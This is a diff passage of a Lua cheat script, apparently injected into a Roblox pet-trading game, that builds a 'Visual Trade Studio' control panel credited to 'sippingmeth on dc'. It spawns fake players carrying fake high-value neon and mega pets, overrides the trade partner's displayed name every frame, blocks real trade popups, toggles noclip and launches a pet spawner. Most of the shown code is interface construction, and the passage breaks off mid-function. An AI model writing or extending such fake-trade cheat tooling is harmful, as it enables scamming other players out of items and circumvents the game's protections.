+    sub.Parent = mainFrame
+
+    local function styleBox(box)
+        box.BackgroundColor3 = Color3.fromRGB(20, 25, 50)
+        box.BackgroundTransparency = 0
+        box.BorderSizePixel = 0
+        box.Font = Enum.Font.Gotham
+        box.TextSize = 12
+        box.TextColor3 = Color3.fromRGB(240, 245, 255)
+        box.TextXAlignment = Enum.TextXAlignment.Left
+        local c = Instance.new("UICorner")
+        c.CornerRadius = UDim.new(0, 6)
+        c.Parent = box
+        local s = Instance.new("UIStroke")
+        s.Color = Color3.fromRGB(80, 110, 200)
+        s.Thickness = 1
+        s.Transparency = 0.3
+        s.Parent = box
+    end
+
+    local userBox = Instance.new("TextBox")
+    userBox.Name = "UserBox"
+    userBox.Size = UDim2.new(1, -24, 0, 30)
+    userBox.Position = UDim2.new(0, 12, 0, 58)
+    userBox.ClearTextOnFocus = false
+    userBox.PlaceholderText = "Roblox username"
+    userBox.PlaceholderColor3 = Color3.fromRGB(120, 140, 190)
+    userBox.Text = ""
+    userBox.Parent = mainFrame
+    styleBox(userBox)
+
+    -- Add preset user dropdown button
+local presetButton = Instance.new("TextButton")
+presetButton.Name = "PresetButton"
+presetButton.Size = UDim2.new(0.3, -2, 0, 30)
+presetButton.Position = UDim2.new(0.7, 2, 0, 58)
+presetButton.Text = "Presets ▼"
+presetButton.Font = Enum.Font.GothamBold
+presetButton.TextSize = 11
+presetButton.TextColor3 = Color3.new(1,1,1)
+presetButton.BackgroundColor3 = Color3.fromRGB(40, 70, 150)
+presetButton.Parent = mainFrame
+presetButton.ZIndex = 99
+
+local c0 = Instance.new("UICorner")
+c0.CornerRadius = UDim.new(0, 6)
+c0.Parent = presetButton
+
+-- Preset dropdown frame (hidden by default)
+local presetFrame = Instance.new("Frame")
+presetFrame.Name = "PresetFrame"
+presetFrame.Size = UDim2.new(0.3, -2, 0, 120)
+presetFrame.Position = UDim2.new(0.7, 2, 0, 88)
+presetFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 50)
+presetFrame.BorderSizePixel = 0
+presetFrame.Visible = false
+presetFrame.Parent = mainFrame
+presetFrame.ZIndex = 100
+
+local c1 = Instance.new("UICorner")
+c1.CornerRadius = UDim.new(0, 6)
+c1.Parent = presetFrame
+
+local s1 = Instance.new("UIStroke")
+s1.Color = Color3.fromRGB(80, 110, 200)
+s1.Thickness = 1
+s1.Parent = presetFrame
+
+local presetList = Instance.new("ScrollingFrame")
+presetList.Size = UDim2.new(1, -4, 1, -4)
+presetList.Position = UDim2.new(0, 2, 0, 2)
+presetList.BackgroundTransparency = 1  -- Keep transparent so buttons show
+presetList.BorderSizePixel = 0
+presetList.ScrollBarThickness = 4
+presetList.ScrollBarImageColor3 = Color3.fromRGB(100, 120, 200)
+presetList.Parent = presetFrame
+presetList.ZIndex = 101
+
+local presetListLayout = Instance.new("UIListLayout")
+presetListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+presetListLayout.Padding = UDim.new(0, 2)
+presetListLayout.Parent = presetList
+
+-- Populate preset list
+for i, username in ipairs(presetUsers) do
+    local presetBtn = Instance.new("TextButton")
+    presetBtn.Size = UDim2.new(1, 0, 0, 22)
+    presetBtn.Text = username
+    presetBtn.Font = Enum.Font.Gotham
+    presetBtn.TextSize = 10
+    presetBtn.TextColor3 = Color3.new(1,1,1)
+    presetBtn.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
+    presetBtn.BorderSizePixel = 0
+    presetBtn.LayoutOrder = i
+    presetBtn.Parent = presetList
+    presetBtn.ZIndex = 102  -- Higher than presetList
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 4)
+    btnCorner.Parent = presetBtn
+    
+    presetBtn.MouseButton1Click:Connect(function()
+        userBox.Text = username
+        presetFrame.Visible = false
+        presetButton.Text = "Presets ▼"
+    end)
+end
+
+presetButton.MouseButton1Click:Connect(function()
+    presetFrame.Visible = not presetFrame.Visible
+    presetButton.Text = presetFrame.Visible and "Presets ▲" or "Presets ▼"
+end)
+
+presetList.CanvasSize = UDim2.new(0, 0, 0, #presetUsers * 24)
+    local function styleBtn(btn, bg, txt)
+        btn.BackgroundColor3 = bg
+        btn.BorderSizePixel = 0
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 12
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Text = txt
+        local c = Instance.new("UICorner")
+        c.CornerRadius = UDim.new(0, 6)
+        c.Parent = btn
+        local s = Instance.new("UIStroke")
+        s.Color = Color3.fromRGB(255, 255, 255)
+        s.Thickness = 1
+        s.Transparency = 0.4
+        s.Parent = btn
+    end
+
+    local spawnButton = Instance.new("TextButton")
+    spawnButton.Name = "SpawnButton"
+    spawnButton.Size = UDim2.new(0.48, -6, 0, 32)
+    spawnButton.Position = UDim2.new(0, 12, 0, 100)
+    spawnButton.Parent = mainFrame
+    styleBtn(spawnButton, Color3.fromRGB(30, 80, 180), "SPAWN")
+
+    local randomButton = Instance.new("TextButton")
+    randomButton.Name = "RandomButton"
+    randomButton.Size = UDim2.new(0.48, -6, 0, 32)
+    randomButton.Position = UDim2.new(0.52, 0, 0, 100)
+    randomButton.Parent = mainFrame
+    styleBtn(randomButton, Color3.fromRGB(40, 60, 120), "RANDOM")
+
+    -- Pet type selection
+    local petTypeLabel = Instance.new("TextLabel")
+    petTypeLabel.Size = UDim2.new(1, -24, 0, 16)
+    petTypeLabel.Position = UDim2.new(0, 12, 0, 140)
+    petTypeLabel.BackgroundTransparency = 1
+    petTypeLabel.Text = "Pet Type:"
+    petTypeLabel.Font = Enum.Font.Gotham
+    petTypeLabel.TextSize = 11
+    petTypeLabel.TextColor3 = Color3.fromRGB(180, 200, 240)
+    petTypeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    petTypeLabel.Parent = mainFrame
+
+    local petTypeContainer = Instance.new("Frame")
+    petTypeContainer.Size = UDim2.new(1, -24, 0, 28)
+    petTypeContainer.Position = UDim2.new(0, 12, 0, 156)
+    petTypeContainer.BackgroundTransparency = 1
+    petTypeContainer.Parent = mainFrame
+
+    local currentFakePetType = 'regular'
+    local petTypeButtons = {}
+
+    local petTypes = {'regular', 'neon', 'mega'}
+    local petTypeNames = {'REG', 'NEON', 'MEGA'}
+    local petTypeColors = {
+        Color3.fromRGB(50, 150, 50),
+        Color3.fromRGB(0, 200, 255),
+        Color3.fromRGB(170, 0, 255)
+    }
+
+    for i, petType in ipairs(petTypes) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0.32, -2, 1, 0)
+        btn.Position = UDim2.new((i-1)*0.32, 0, 0, 0)
+        btn.Text = petTypeNames[i]
+        btn.BackgroundColor3 = petType == 'regular' and petTypeColors[1] or Color3.fromRGB(60, 60, 80)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 10
+        btn.TextColor3 = Color3.new(1,1,1)
+        btn.Parent = petTypeContainer
+        local c = Instance.new("UICorner")
+        c.CornerRadius = UDim.new(0, 4)
+        c.Parent = btn
+        petTypeButtons[petType] = btn
+        
+        btn.MouseButton1Click:Connect(function()
+            currentFakePetType = petType
+            for pType, button in pairs(petTypeButtons) do
+                button.BackgroundColor3 = pType == petType and petTypeColors[i] or Color3.fromRGB(60, 60, 80)
+            end
+        end)
+    end
+
+    local clearButton = Instance.new("TextButton")
+    clearButton.Name = "ClearButton"
+    clearButton.Size = UDim2.new(1, -24, 0, 30)
+    clearButton.Position = UDim2.new(0, 12, 0, 192)
+    clearButton.Parent = mainFrame
+    styleBtn(clearButton, Color3.fromRGB(180, 50, 50), "CLEAR ALL")
+
+    clearButton.MouseButton1Click:Connect(function()
+        pcall(clearAllFakePlayers)
+    end)
+
+    local noclipToggle = Instance.new("TextButton")
+    noclipToggle.Size = UDim2.new(1, -24, 0, 26)
+    noclipToggle.Position = UDim2.new(0, 12, 0, 230)
+    noclipToggle.Text = "Noclip: OFF"
+    noclipToggle.Font = Enum.Font.Gotham
+    noclipToggle.TextSize = 11
+    noclipToggle.TextColor3 = Color3.new(1,1,1)
+    noclipToggle.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
+    noclipToggle.Parent = mainFrame
+    local c3 = Instance.new("UICorner")
+    c3.CornerRadius = UDim.new(0, 6)
+    c3.Parent = noclipToggle
+    local noclipEnabled = false
+
+    noclipToggle.MouseButton1Click:Connect(function()
+        noclipEnabled = not noclipEnabled
+        noclipToggle.Text = "Noclip: " .. (noclipEnabled and "ON" or "OFF")
+        noclipToggle.BackgroundColor3 = noclipEnabled and Color3.fromRGB(80, 120, 200) or Color3.fromRGB(80, 80, 120)
+    end)
+
+    local info = Instance.new("TextLabel")
+    info.Size = UDim2.new(1, -24, 0, 16)
+    info.Position = UDim2.new(0, 12, 1, -20)
+    info.BackgroundTransparency = 1
+    info.Font = Enum.Font.Gotham
+    info.TextSize = 10
+    info.TextColor3 = Color3.fromRGB(150, 170, 210)
+    info.TextXAlignment = Enum.TextXAlignment.Left
+    info.Text = "players.txt system - always spawns with pet"
+    info.Parent = mainFrame
+
+    --========== SPAWN FUNCTIONS ==========
+    local function getRandomUsername()
+        local parts = {
+            "lili","gabby","maddie","riley","lucy",
+            "ava","carter","champion","toasty","santa"
+        }
+        local tail = tostring(math.random(10, 9999))
+        return parts[math.random(1, #parts)] .. tail
+    end
+
+    local function trim(str)
+        return (str:gsub("^%s+", ""):gsub("%s+$", ""))
+    end
+
+    local function spawnFakePlayer(username, isRandom)
+        username = trim(username or "")
+        
+        if isRandom then
+            if username == "" then
+                username = getRandomUsername()
+            end
+        end
+
+        if username == "" then
+            username = getRandomUsername()
+        end
+
+        local partner_id
+        pcall(function()
+            partner_id = Players:GetUserIdFromNameAsync(username)
+        end)
+        if not partner_id then
+            partner_id = math.random(100000, 999999)
+        end
+
+        local petFlags = {
+            M = currentFakePetType == 'mega',
+            N = currentFakePetType == 'neon',
+            F = true,
+            R = true,
+        }
+
+        local success = CreateFakePlayerCharacter(username, partner_id, currentFakePetType, petFlags)
+        return success
+    end
+
+    --========== buttons ==========
+    spawnButton.MouseButton1Click:Connect(function()
+        spawnFakePlayer(userBox.Text, false)
+    end)
+
+    randomButton.MouseButton1Click:Connect(function()
+        spawnFakePlayer("", true)
+    end)
+
+    print("✅ Fake Player Spawner loaded (players.txt system only)")
+    print("🎈 Always spawns with high-value pet (Balloon Unicorn+)")
+    print("🎨 Neon/Mega neon effects from players.txt")
+    print("📱 Royal Blue Minimal UI (Gotham, rectangular)")
+    print("👤 Preset users added: " .. #presetUsers .. " names")
+end
+
+local function formatPetName(kind)
+    return kind:gsub("_", " "):gsub("(%a)([%w_']*)", function(a,b)
+        return a:upper() .. b:lower()
+    end)
+end
+
+local function tagForProps(props)
+    if props and props.mega_neon then return "MFR" end
+    if props and props.neon then return "NFR" end
+    return "FR"
+end
+
+local function getLocalState()
+    if TradeApp and TradeApp._get_local_trade_state then
+        return TradeApp:_get_local_trade_state()
+    end
+    return nil
+end
+
+-------------------------------------------------
+-- SIMPLE NAME FIXER (only inside TradeApp)    --
+-------------------------------------------------
+local partnerNameLabel      -- the label inside the trade UI
+local partnerNameConn       -- RenderStepped connection
+
+local function findPartnerNameLabel()
+    if partnerNameLabel and partnerNameLabel.Parent then
+        return partnerNameLabel
+    end
+
+    local frame = TradeApp.frame
+    if not frame or not frame.Parent then
+        return nil
+    end
+
+    local targetLower = tostring(currentTargetName or ""):lower()
+    if targetLower == "" then return nil end
+
+    for _, d in ipairs(frame:GetDescendants()) do
+        if (d:IsA("TextLabel") or d:IsA("TextButton")) and typeof(d.Text) == "string" then
+            if d.Text:lower() == targetLower then
+                partnerNameLabel = d
+                return partnerNameLabel
+            end
+        end
+    end
+    return nil
+end
+
+local function updatePartnerName()
+    if not fakeActive then return end
+    local lbl = findPartnerNameLabel()
+    if not lbl then return end
+    if typeof(lbl.Text) == "string"
+        and lbl.Text ~= currentTargetDisplayName
+        and lbl.Text:lower() == tostring(currentTargetName or ""):lower()
+    then
+        lbl.Text = currentTargetDisplayName
+    end
+end
+
+local function startNameFix()
+    if partnerNameConn then partnerNameConn:Disconnect() end
+    partnerNameConn = RunService.RenderStepped:Connect(updatePartnerName)
+end
+
+local function stopNameFix()
+    if partnerNameConn then
+        partnerNameConn:Disconnect()
+        partnerNameConn = nil
+    end
+    partnerNameLabel = nil
+end
+
+---------------------------------
+-- ScreenGui & intro / main UI --
+---------------------------------
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VisualTradeGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- intro card
+local introFrame = Instance.new("Frame")
+introFrame.Name = "IntroFrame"
+introFrame.Size = UDim2.new(0, 240, 0, 110)
+introFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+introFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+introFrame.BackgroundColor3 = Color3.fromRGB(16, 18, 26)
+introFrame.BorderSizePixel = 0
+introFrame.Parent = screenGui
+
+local introCorner = Instance.new("UICorner")
+introCorner.CornerRadius = UDim.new(0, 14)
+introCorner.Parent = introFrame
+
+local introStroke = Instance.new("UIStroke")
+introStroke.Thickness = 2
+introStroke.Color = Color3.fromRGB(90, 110, 255)
+introStroke.Transparency = 0.2
+introStroke.Parent = introFrame
+
+local introTitle = Instance.new("TextLabel")
+introTitle.Size = UDim2.new(1, -20, 0, 28)
+introTitle.Position = UDim2.new(0, 10, 0, 10)
+introTitle.BackgroundTransparency = 1
+introTitle.Font = Enum.Font.GothamBold
+introTitle.TextSize = 18
+introTitle.TextColor3 = Color3.fromRGB(230, 235, 255)
+introTitle.TextXAlignment = Enum.TextXAlignment.Left
+introTitle.Text = "Visual Trade Studio"
+introTitle.Parent = introFrame
+
+local introSub = Instance.new("TextLabel")
+introSub.Size = UDim2.new(1, -20, 0, 40)
+introSub.Position = UDim2.new(0, 10, 0, 38)
+introSub.BackgroundTransparency = 1
+introSub.Font = Enum.Font.Gotham
+introSub.TextSize = 12
+introSub.TextWrapped = true
+introSub.TextColor3 = Color3.fromRGB(180, 188, 230)
+introSub.TextXAlignment = Enum.TextXAlignment.Left
+introSub.Text = "Open the panel to start a local-only visual trade."
+introSub.Parent = introFrame
+
+local introButton = Instance.new("TextButton")
+introButton.Size = UDim2.new(0, 120, 0, 30)
+introButton.Position = UDim2.new(0, 10, 1, -40)
+introButton.BackgroundColor3 = Color3.fromRGB(90, 110, 255)
+introButton.Font = Enum.Font.GothamBold
+introButton.TextSize = 13
+introButton.TextColor3 = Color3.new(1,1,1)
+introButton.BorderSizePixel = 0
+introButton.Text = "Open Panel"
+introButton.Parent = introFrame
+
+local introButtonCorner = Instance.new("UICorner")
+introButtonCorner.CornerRadius = UDim.new(0, 8)
+introButtonCorner.Parent = introButton
+
+-- main panel (small + draggable)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "ControlPanel"
+mainFrame.Size = UDim2.new(0, 185, 0, 450)   -- taller
+mainFrame.Position = UDim2.new(0, 10, 0, 60) -- a bit higher on screen
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        mainFrame.Visible = not mainFrame.Visible
+    end
+end)
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(60, 70, 130)
+mainStroke.Thickness = 2
+mainStroke.Transparency = 0.25
+mainStroke.Parent = mainFrame
+
+-- header
+local titleBar = Instance.new("TextLabel")
+titleBar.Size = UDim2.new(1, -20, 0, 24)
+titleBar.Position = UDim2.new(0, 10, 0, 6)
+titleBar.BackgroundTransparency = 1
+titleBar.Font = Enum.Font.GothamBold
+titleBar.TextSize = 14
+titleBar.Text = "visual trade tool"
+titleBar.TextColor3 = Color3.fromRGB(215, 220, 255)
+titleBar.TextXAlignment = Enum.TextXAlignment.Left
+titleBar.Parent = mainFrame
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -20, 0, 18)
+subtitle.Position = UDim2.new(0, 10, 0, 22)
+subtitle.BackgroundTransparency = 1
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 11
+subtitle.Text = "made by sippingmeth on dc"
+subtitle.TextColor3 = Color3.fromRGB(150, 160, 210)
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = mainFrame
+
+local function setIdleStatus()
+    subtitle.Text = "made by sippingmeth on dc  •  idle"
+end
+
+local function setInTradeStatus()
+    -- sanitize / preserve casing safely
+    local name = tostring(currentTargetDisplayName or "")
+
+    -- build message
+    local msg = "made by sippingmeth on dc  •  trading with " .. name
+
+    -- apply it to the subtitle
+    subtitle.Text = msg
+
+    -- make sure text wraps instead of going off the screen
+    subtitle.TextWrapped = true
+    subtitle.TextScaled = false
+    subtitle.TextTruncate = Enum.TextTruncate.AtEnd
+
+    -- force autosize protection so the label never explodes width
+    subtitle.ClipsDescendants = true
+end
+
+setIdleStatus()
+
+-- tab bar
+-- tab bar (5 tabs: trade / chat / block / pets / bots)
+local tabBar = Instance.new("Frame")
+tabBar.Size = UDim2.new(1, -20, 0, 22)
+tabBar.Position = UDim2.new(0, 10, 0, 40)
+tabBar.BackgroundTransparency = 1
+tabBar.BorderSizePixel = 0
+tabBar.Parent = mainFrame
+
+local TAB_NAMES = { "trade", "chat", "block", "pets", "bots", "set" }
+local tabButtons = {}
+
+for i, name in ipairs(TAB_NAMES) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1/#TAB_NAMES, -2, 1, 0)
+    btn.Position = UDim2.new((i-1)/#TAB_NAMES, (i-1)*2, 0, 0)
+    btn.BackgroundColor3 = (name == "trade") and Color3.fromRGB(60, 70, 130) or Color3.fromRGB(30, 34, 50)
+    btn.BorderSizePixel = 0
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.TextColor3 = (name == "trade") and Color3.new(1,1,1) or Color3.fromRGB(200, 205, 245)
+    btn.Text = name
+    btn.Name = "Tab_" .. name
+    btn.Parent = tabBar
+
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 8)
+    c.Parent = btn
+
+    tabButtons[name] = btn
+end
+
+-- content containers
+local tradeContent = Instance.new("ScrollingFrame")  -- allow scroll when tall
+tradeContent.Name = "TradeContent"
+tradeContent.Size = UDim2.new(1, 0, 1, -60)
+tradeContent.Position = UDim2.new(0, 0, 0, 60)
+tradeContent.BackgroundTransparency = 1
+tradeContent.BorderSizePixel = 0
+tradeContent.ScrollBarThickness = 3       -- tiny scrollbar on the right
+tradeContent.CanvasSize = UDim2.new(0, 0, 0, 0)
+tradeContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
+tradeContent.Parent = mainFrame
+
+local chatContent = Instance.new("Frame")
+chatContent.Name = "ChatContent"
+chatContent.Size = UDim2.new(1, 0, 1, -60)
+chatContent.Position = UDim2.new(0, 0, 0, 60)
+chatContent.BackgroundTransparency = 1
+chatContent.BorderSizePixel = 0
+chatContent.Visible = false
+chatContent.Parent = mainFrame
+
+local blockContent = Instance.new("Frame")
+blockContent.Name = "BlockContent"
+blockContent.Size = UDim2.new(1, 0, 1, -60)
+blockContent.Position = UDim2.new(0, 0, 0, 60)
+blockContent.BackgroundTransparency = 1
+blockContent.BorderSizePixel = 0
+blockContent.Visible = false
+blockContent.Parent = mainFrame
+
+local petToolContent = Instance.new("Frame")
+petToolContent.Name = "PetToolContent"
+petToolContent.Size = UDim2.new(1, 0, 1, -60)
+petToolContent.Position = UDim2.new(0, 0, 0, 60)
+petToolContent.BackgroundTransparency = 1
+petToolContent.BorderSizePixel = 0
+petToolContent.Visible = false
+petToolContent.Parent = mainFrame
+
+local botToolContent = Instance.new("Frame")
+botToolContent.Name = "BotToolContent"
+botToolContent.Size = UDim2.new(1, 0, 1, -60)
+botToolContent.Position = UDim2.new(0, 0, 0, 60)
+botToolContent.BackgroundTransparency = 1
+botToolContent.BorderSizePixel = 0
+botToolContent.Visible = false
+botToolContent.Parent = mainFrame
+
+local settingsContent = Instance.new("Frame")
+settingsContent.Name = "SettingsContent"
+settingsContent.Size = UDim2.new(1, 0, 1, -60)
+settingsContent.Position = UDim2.new(0, 0, 0, 60)
+settingsContent.BackgroundTransparency = 1
+settingsContent.BorderSizePixel = 0
+settingsContent.Visible = false
+settingsContent.Parent = mainFrame
+
+local function selectTab(which)
+    -- visibility
+    tradeContent.Visible    = (which == "trade")
+    chatContent.Visible     = (which == "chat")
+    blockContent.Visible    = (which == "block")
+    petToolContent.Visible  = (which == "pets")
+    botToolContent.Visible  = (which == "bots")
+    settingsContent.Visible = (which == "set")
+
+    -- colors
+    for name, btn in pairs(tabButtons) do
+        local active = (name == which)
+        btn.BackgroundColor3 = active and Color3.fromRGB(60, 70, 130) or Color3.fromRGB(30, 34, 50)
+        btn.TextColor3       = active and Color3.new(1,1,1) or Color3.fromRGB(200, 205, 245)
+    end
+end
+
+for name, btn in pairs(tabButtons) do
+    btn.MouseButton1Click:Connect(function()
+        selectTab(name)
+    end)
+end
+
+-- default tab
+selectTab("trade")
+
+-- Settings tab content
+local settingsCard = Instance.new("Frame")
+settingsCard.Size = UDim2.new(1, -20, 0, 120)
+settingsCard.Position = UDim2.new(0, 10, 0, 10)
+settingsCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+settingsCard.BorderSizePixel = 0
+settingsCard.Parent = settingsContent
+
+local settingsCorner = Instance.new("UICorner")
+settingsCorner.CornerRadius = UDim.new(0, 10)
+settingsCorner.Parent = settingsCard
+
+local settingsTitle = Instance.new("TextLabel")
+settingsTitle.Size = UDim2.new(1, -20, 0, 20)
+settingsTitle.Position = UDim2.new(0, 10, 0, 8)
+settingsTitle.BackgroundTransparency = 1
+settingsTitle.Font = Enum.Font.GothamBold
+settingsTitle.TextSize = 13
+settingsTitle.TextColor3 = Color3.new(1,1,1)
+settingsTitle.TextXAlignment = Enum.TextXAlignment.Left
+settingsTitle.Text = "trade settings"
+settingsTitle.Parent = settingsCard
+
+------------------------------
+-- Toggle: random spectators --
+------------------------------
+local randLabel = Instance.new("TextLabel")
+randLabel.Size = UDim2.new(0.7, -20, 0, 20)
+randLabel.Position = UDim2.new(0, 10, 0, 38)
+randLabel.BackgroundTransparency = 1
+randLabel.Font = Enum.Font.Gotham
+randLabel.TextSize = 11
+randLabel.TextColor3 = Color3.fromRGB(200, 205, 245)
+randLabel.TextXAlignment = Enum.TextXAlignment.Left
+randLabel.Text = "random spectators"
+randLabel.Parent = settingsCard
+
+local randToggle = Instance.new("TextButton")
+randToggle.Size = UDim2.new(0, 60, 0, 20)
+randToggle.Position = UDim2.new(1, -70, 0, 38)
+randToggle.BorderSizePixel = 0
+randToggle.Font = Enum.Font.GothamBold
+randToggle.TextSize = 11
+randToggle.TextColor3 = Color3.new(1,1,1)
+randToggle.Parent = settingsCard
+
+local randCorner = Instance.new("UICorner")
+randCorner.CornerRadius = UDim.new(0, 8)
+randCorner.Parent = randToggle
+
+local function updateRandToggle()
+    if randomSpectatorsEnabled then
+        randToggle.Text = "on"
+        randToggle.BackgroundColor3 = Color3.fromRGB(82, 182, 134)
+    else
+        randToggle.Text = "off"
+        randToggle.BackgroundColor3 = Color3.fromRGB(55, 60, 90)
+    end
+end
+
+randToggle.MouseButton1Click:Connect(function()
+    randomSpectatorsEnabled = not randomSpectatorsEnabled
+    updateRandToggle()
+    applySpectatorMode()
+end)
+
+-------------------------------
+-- Toggle: block real trades --
+-------------------------------
+local blockLabel = Instance.new("TextLabel")
+blockLabel.Size = UDim2.new(0.7, -20, 0, 20)
+blockLabel.Position = UDim2.new(0, 10, 0, 68)
+blockLabel.BackgroundTransparency = 1
+blockLabel.Font = Enum.Font.Gotham
+blockLabel.TextSize = 11
+blockLabel.TextColor3 = Color3.fromRGB(200, 205, 245)
+blockLabel.TextXAlignment = Enum.TextXAlignment.Left
+blockLabel.Text = "block real trade popups"
+blockLabel.Parent = settingsCard
+
+local blockToggle = Instance.new("TextButton")
+blockToggle.Size = UDim2.new(0, 60, 0, 20)
+blockToggle.Position = UDim2.new(1, -70, 0, 68)
+blockToggle.BorderSizePixel = 0
+blockToggle.Font = Enum.Font.GothamBold
+blockToggle.TextSize = 11
+blockToggle.TextColor3 = Color3.new(1,1,1)
+blockToggle.Parent = settingsCard
+
+local blockCorner = Instance.new("UICorner")
+blockCorner.CornerRadius = UDim.new(0, 8)
+blockCorner.Parent = blockToggle
+
+local function updateBlockToggle()
+    if blockRealRequestsEnabled then
+        blockToggle.Text = "on"
+        blockToggle.BackgroundColor3 = Color3.fromRGB(82, 182, 134)
+    else
+        blockToggle.Text = "off"
+        blockToggle.BackgroundColor3 = Color3.fromRGB(55, 60, 90)
+    end
+end
+
+blockToggle.MouseButton1Click:Connect(function()
+    blockRealRequestsEnabled = not blockRealRequestsEnabled
+    updateBlockToggle()
+end)
+
+-- initialize toggle visuals
+updateRandToggle()
+updateBlockToggle()
+
+
+
+-- Pet Spawner tab content
+local petCard = Instance.new("Frame")
+petCard.Size = UDim2.new(1, -20, 0, 80)
+petCard.Position = UDim2.new(0, 10, 0, 10)
+petCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+petCard.BorderSizePixel = 0
+petCard.Parent = petToolContent
+
+local petCorner = Instance.new("UICorner")
+petCorner.CornerRadius = UDim.new(0, 10)
+petCorner.Parent = petCard
+
+local petTitle = Instance.new("TextLabel")
+petTitle.Size = UDim2.new(1, -16, 0, 20)
+petTitle.Position = UDim2.new(0, 8, 0, 6)
+petTitle.BackgroundTransparency = 1
+petTitle.Font = Enum.Font.FredokaOne
+petTitle.TextSize = 14
+petTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+petTitle.TextXAlignment = Enum.TextXAlignment.Left
+petTitle.Text = "💸 Pet Spawner 💸"
+petTitle.Parent = petCard
+
+local petSub = Instance.new("TextLabel")
+petSub.Size = UDim2.new(1, -16, 0, 16)
+petSub.Position = UDim2.new(0, 8, 0, 26)
+petSub.BackgroundTransparency = 1
+petSub.Font = Enum.Font.Gotham
+petSub.TextSize = 10
+petSub.TextColor3 = Color3.fromRGB(200, 210, 255)
+petSub.TextXAlignment = Enum.TextXAlignment.Left
+petSub.Text = "opens your pet spawner window"
+petSub.Parent = petCard
+
+local petRun = Instance.new("TextButton")
+petRun.Size = UDim2.new(0, 120, 0, 24)
+petRun.Position = UDim2.new(0, 8, 1, -30)
+petRun.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+petRun.BorderSizePixel = 0
+petRun.Font = Enum.Font.FredokaOne
+petRun.TextSize = 14
+petRun.TextColor3 = Color3.new(1,1,1)
+petRun.Text = "launch spawner"
+petRun.Parent = petCard
+
+local petRunCorner = Instance.new("UICorner")
+petRunCorner.CornerRadius = UDim.new(0, 8)
+petRunCorner.Parent = petRun
+
+petRun.MouseButton1Click:Connect(function()
+    print("[PetSpawner] clicked")
+
+    local ok, err = pcall(runPetSpawner)
+    if not ok then
+        warn("[PetSpawner] error: " .. tostring(err))
+    end
+end)
+
+-- =========================
+-- Block tab content (CJL only)
+-- =========================
+local blockCard = Instance.new("Frame")
+blockCard.Size = UDim2.new(1, -20, 0, 80)
+blockCard.Position = UDim2.new(0, 10, 0, 10)
+blockCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+blockCard.BorderSizePixel = 0
+blockCard.Parent = blockContent
+
+local blockCardCorner = Instance.new("UICorner")
+blockCardCorner.CornerRadius = UDim.new(0, 10)
+blockCardCorner.Parent = blockCard
+
+local blockTitle = Instance.new("TextLabel")
+blockTitle.Size = UDim2.new(1, -16, 0, 20)
+blockTitle.Position = UDim2.new(0, 8, 0, 6)
+blockTitle.BackgroundTransparency = 1
+blockTitle.Font = Enum.Font.GothamBold
+blockTitle.TextSize = 12
+blockTitle.TextColor3 = Color3.fromRGB(210, 215, 255)
+blockTitle.TextXAlignment = Enum.TextXAlignment.Left
+blockTitle.Text = "Envision Block"
+blockTitle.Parent = blockCard
+
+local blockSub = Instance.new("TextLabel")
+blockSub.Size = UDim2.new(1, -16, 0, 16)
+blockSub.Position = UDim2.new(0, 8, 0, 28)
+blockSub.BackgroundTransparency = 1
+blockSub.Font = Enum.Font.Gotham
+blockSub.TextSize = 11
+blockSub.TextColor3 = Color3.fromRGB(160, 165, 200)
+blockSub.TextXAlignment = Enum.TextXAlignment.Left
+blockSub.Text = "open the envision block ui"
+blockSub.Parent = blockCard
+
+local blockRun = Instance.new("TextButton")
+blockRun.Size = UDim2.new(0, 140, 0, 24)
+blockRun.Position = UDim2.new(0, 8, 1, -30)
+blockRun.BackgroundColor3 = Color3.fromRGB(82, 182, 134)
+blockRun.BorderSizePixel = 0
+blockRun.Font = Enum.Font.GothamBold
+blockRun.TextSize = 12
+blockRun.TextColor3 = Color3.new(1,1,1)
+blockRun.Text = "open envision block"
+blockRun.Parent = blockCard
+
+local blockRunCorner = Instance.new("UICorner")
+blockRunCorner.CornerRadius = UDim.new(0, 8)
+blockRunCorner.Parent = blockRun
+
+local cjlOpen = false
+blockRun.MouseButton1Click:Connect(function()
+    local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
+
+    -- if CJL already exists, just show it
+    local existing = pg and pg:FindFirstChild("CJL_UI_MAX")
+    if existing then
+        existing.Enabled = true
+        cjlOpen = true
+        return
+    end
+
+    -- run CJL once
+    if cjlOpen then return end
+    cjlOpen = true
+
+    task.spawn(function()
